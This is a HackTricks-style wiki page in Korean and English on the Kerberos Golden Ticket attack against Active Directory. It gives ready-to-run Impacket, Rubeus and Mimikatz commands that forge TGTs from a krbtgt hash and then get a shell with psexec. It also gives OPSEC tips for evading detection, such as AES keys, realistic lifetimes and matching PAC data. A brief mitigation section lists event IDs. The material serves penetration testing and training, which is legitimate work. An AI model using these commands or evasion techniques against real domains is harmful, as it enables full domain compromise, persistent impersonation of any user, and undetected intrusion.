# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** attack는 **Active Directory(AD) krbtgt account의 NTLM hash**를 사용해 **어떤 user라도 impersonating하는 legitimate Ticket Granting Ticket (TGT)를 생성**하는 방식입니다. 이 technique은 impersonated user로서 **domain 내 모든 service 또는 machine에 access할 수 있게 한다**는 점에서 특히 유용합니다. **krbtgt account의 credentials는 자동으로 업데이트되지 않는다**는 점을 반드시 기억해야 합니다.<sup>[[1]](#references)</sup>

**krbtgt account의 NTLM hash를 획득**하기 위해 다양한 방법을 사용할 수 있습니다. Domain 내 모든 Domain Controller (DC)에 있는 **Local Security Authority Subsystem Service (LSASS) process** 또는 **NT Directory Services (NTDS.dit) file**에서 추출할 수 있습니다. 또한 **DCsync attack을 실행**하는 것도 이 NTLM hash를 얻는 방법이며, Mimikatz의 **lsadump::dcsync module** 또는 Impacket의 **secretsdump.py script**와 같은 tools를 사용해 수행할 수 있습니다. 이러한 작업을 수행하려면 일반적으로 **domain admin privileges 또는 이에 준하는 access level이 필요하다**는 점을 강조해야 합니다.<sup>[[2]](#references)</sup>

NTLM hash가 이 목적에 사용 가능한 방법이기는 하지만, operational security상의 이유로 **Advanced Encryption Standard (AES) Kerberos keys (AES128 및 AES256)를 사용해 ticket을 forge하는 것을 강력히 권장**합니다. 이는 최신 domain에서 더욱 중요합니다. **RC4 사용은 단계적으로 중단되고 있으며**, Kerberos telemetry에서 훨씬 더 명확하게 드러나기 때문입니다.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### 최신 ticket 제작 참고 사항

가능한 경우, 먼저 **LDAP 및 SYSVOL을 query**한 다음 수동으로 값을 만들어 내는 대신 실제 domain policy 및 user PAC 값을 사용하여 ticket을 forge하세요:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap`는 더 현실적인 PAC를 구축하는 데 사용되는 사용자, 그룹, NetBIOS 및 policy 데이터를 DC에 요청합니다.
- `/printcmd`는 검색된 PAC 필드가 포함된 오프라인 command line을 출력합니다. 나중에 LDAP에 다시 접근하지 않고 동일한 ticket을 forge하려는 경우 유용합니다.
- `/extendedupndns`는 `samAccountName` 및 계정 SID가 포함된 최신 `UpnDns` PAC elements를 추가합니다.
- `/oldpac`는 최신 `Requestor` 및 `Attributes` PAC buffers를 제거합니다. 이는 기본 tradecraft가 아니라 이전 환경과의 호환성 테스트에 주로 유용합니다.

Linux에서는 최신 Impacket versions를 사용해 최신 PAC structures를 추가하고 현실적인 validity period를 설정할 수도 있습니다:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration`은 **시간** 단위입니다. 기본값은 **10년**이며, 이는 탐지되기 쉽습니다.
- `-extra-pac`은 새로운 `UPN_DNS` PAC 정보를 추가합니다.
- `-old-pac`은 레거시 PAC 레이아웃을 강제합니다.
- `-extra-sid`는 PAC에 추가 SIDs가 필요할 때 유용합니다(예: [SID-History Injection](sid-history-injection.md)에서 다루는 child-to-parent escalation 시나리오).

**Golden Ticket을 주입한 후** 공유 파일 **(C$)**에 액세스하고 services 및 WMI를 실행할 수 있으므로, **psexec** 또는 **wmiexec**을 사용해 shell을 얻을 수 있습니다(winrm을 통해서는 shell을 얻을 수 없는 것 같습니다).

### 일반적인 탐지 우회

Golden Ticket을 탐지하는 가장 일반적인 방법은 wire 상의 **Kerberos 트래픽을 검사**하는 것입니다. 기본적으로 Mimikatz는 **TGT에 10년의 유효 기간을 서명**하므로, 해당 TGT로 이후에 수행되는 TGS 요청에서 비정상적인 값으로 나타납니다.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`, `/endin`, `/renewmax` 매개 변수를 사용해 시작 오프셋, 기간 및 최대 갱신 횟수를 제어할 수 있습니다(모두 분 단위).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
안타깝게도 TGT의 lifetime은 4769 이벤트에 기록되지 않으므로 Windows event logs에서 이 정보를 찾을 수 없습니다. 그러나 상관관계를 확인할 수 있는 것은 **이전에 4768이 발생하지 않았는데 4769가 발생하는 경우**입니다. **TGT 없이 TGS를 요청하는 것은 불가능**하며, TGT가 발급되었다는 기록이 없다면 offline 상태에서 위조되었다고 추론할 수 있습니다.

**최신 Windows builds**에서는 Event ID **4768** 및 **4769**에서 훨씬 향상된 **encryption type telemetry**도 제공합니다. `krbtgt`, clients 및 services가 이미 AES keys를 보유한 domain에서 **RC4 (`0x17`)**를 사용하는 forged TGT/TGS는 몇 년 전보다 훨씬 쉽게 탐지할 수 있습니다. 따라서 **AES-backed Golden Tickets**를 사용하고 domain의 일반적인 Kerberos policy를 가능한 한 정확히 일치시키는 것이 더욱 중요합니다.

또 다른 OPSEC 문제는 **PAC fidelity**입니다. 존재할 수 없는 group memberships, 누락된 최신 PAC buffers 또는 LDAP와 일치하지 않는 account metadata를 포함한 tickets는 defenders가 PAC contents를 AD data와 대조하여 검증할 때 더 쉽게 탐지됩니다. 실제로 DC에서 발급된 것처럼 보이는 TGT가 필요하다면 다음을 참고하십시오.

{{#ref}}
diamond-ticket.md
{{#endref}}

persistence에는 **environmental limits**도 있습니다. `krbtgt` account는 **password history를 2개 유지**하므로, forged TGT가 이전 key로 서명되었다면 **첫 번째** `krbtgt` reset 이후에도 유효할 수 있습니다. 이것이 defenders가 **`krbtgt`를 두 번 reset**하고 reset 사이에 최소한 domain의 maximum ticket lifetime만큼 기다려 Golden Tickets를 무효화하는 이유입니다.<sup>[[3]](#references)</sup>

이 **detection을 우회**하려면 diamond tickets를 확인하십시오.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

defenders가 사용할 수 있는 다른 간단한 방법으로는 default domain administrator account와 같은 **sensitive users**에 대한 4769 발생을 **alert**하고, 일반적으로 AES tickets를 발급하는 domains에서 `krbtgt`에 대한 **RC4 사용을 alert**하는 것이 있습니다.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): Kerberos를 공격하는 방법?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - krbtgt password reset | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – service account ticket issuance를 위한 Kerberos KDC의 RC4 사용 관리 (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
